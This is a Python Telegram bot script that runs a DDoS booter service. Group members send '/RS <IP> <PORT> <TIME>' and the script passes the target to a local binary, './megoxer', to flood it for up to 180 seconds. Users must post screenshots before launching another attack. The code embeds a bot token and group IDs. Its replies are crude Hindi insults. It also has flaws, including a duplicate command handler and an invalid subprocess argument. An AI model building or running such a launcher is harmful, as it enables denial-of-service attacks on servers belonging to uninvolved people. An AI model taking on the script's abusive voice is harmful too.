#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# Telegram bot token
bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Global variables
is_attack_running = False
attack_end_time = None
pending_feedback = {}
update_thread = None
current_attack_message = None

# Function to check if user is in channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to update attack status
def update_attack_status(chat_id, message_id, target, port):
    global is_attack_running, attack_end_time

    while is_attack_running:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        if remaining_time <= 0:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text="✅ **ATTACK KHATAM BSDK! AB SCREENSHOT BHEJ WARNA MAA KI CH** 📸"
            )
            is_attack_running = False
            return

        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"""🔥 **ATTACK CHALU HAI BSDK!** 🔥  
🎯 **TARGET:** `{target}`  
🔢 **PORT:** `{port}`  
⏳ **BAAKI TIME:** `{int(remaining_time)}s`  
🚀 **GAAND MAT MARA , SCREENSHOT READY RAKH!**"""
            )
        except:
            pass  

        time.sleep(1)

# Handle attack command
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    global is_attack_running, attack_end_time, update_thread, current_attack_message
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **ABE CHUTIYE! YE BOT SIRF GROUP ME CHALTA HAI! BHAAG YAHA SE!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KAR BSDK, WARNA KUCH NAHI MILEGA!** {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **ABE PEHLE SCREENSHOT BHEJ BSDK! WARNA NAYA ATTACK BHUL JAA!**")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ **ABE RUK NA CHUTIYE! PEHLE WALA ATTACK KHATAM HONE DE! JALDI ME KYUN MAR RAHA HAI?**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **USAGE: /RS  <IP>  <PORT>  <TIME> **\n😎 **SAHI LIKH CHUTIYE! WARNA GAAND MAAR LENGE!POWERED BY-- @R_SDanger !!**")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE! KITNA GANJA PHOONK RAHA HAI BSDK?**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **180 SEC SE ZYADA NAHI MILEGA! TERI MAA KO BHI NAHI!**")
        return

    # Confirm attack
    confirm_msg = f"""⚡ **ATTACK CONFIRMED CHUTIYE!**  
🎯 **TARGET:** `{target}`  
🔢 **PORT:** `{port}`  
⏳ **DURATION:** `{time_duration}s`  
🚀 **JA BETA, ATTACK CHALU HO GAYA!**  
📸 **SCREENSHOT BHEJ WARNA GAAND MAAR LENGE!**"""

    msg = bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
    current_attack_message = msg

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  

    update_thread = threading.Thread(target=update_attack_status, args=(message.chat.id, msg.message_id, target, port))
    update_thread.start()

    try:
        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, RS=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA BSDK! TERI NASEEB HI KHARAB HAI!**")
        is_attack_running = False
        attack_end_time = None
        return

    is_attack_running = False
    attack_end_time = None

# Handle /RS command
@bot.message_handler(commands=['RS'])
def handle_check(message):
    if is_attack_running and attack_end_time:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"⏳ **GAAND MARA MAT BSDK, ATTACK CHAL RAHA HAI! BAAKI TIME: {int(remaining_time)}s**")
    else:
        bot.reply_to(message, "✅ **ATTACK KHATAM! AB NAYA LAGA CHUTIYE!**")

# Handle screenshot submission and forward to main channel
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  
        bot.send_message(CHANNEL_USERNAME, f"📸 **USER `{user_id}` KA SCREENSHOT AA GAYA! BEHNCHOD OP!**")

        bot.reply_to(message, "✅ **CHAL AB NAYA ATTACK MAAR SAKTA HAI, WARNA BHAAG!** 🚀")
        del pending_feedback[user_id]  
    else:
        bot.reply_to(message, "❌ **ABE CHUTIYE, SCREENSHOT KI ZAROORAT NAHI AB! KYA KAR RAHA HAI?**")

# Bot start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 OYE {user_name}! 🔥🌟  

🚀 **BSDK READY HO JAA!**  
💥 ATTACK KARNE KA FULL CHANCE HAI!  

🔗 **GROUP JOIN KAR WARNA BSDK BAN JAYEGA!**  
👉 [TELEGRAM GROUP](https://t.me/R_SDanger_op) 🚀🔥""" 
    
    bot.reply_to(message, response, parse_mode="Markdown")

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(1)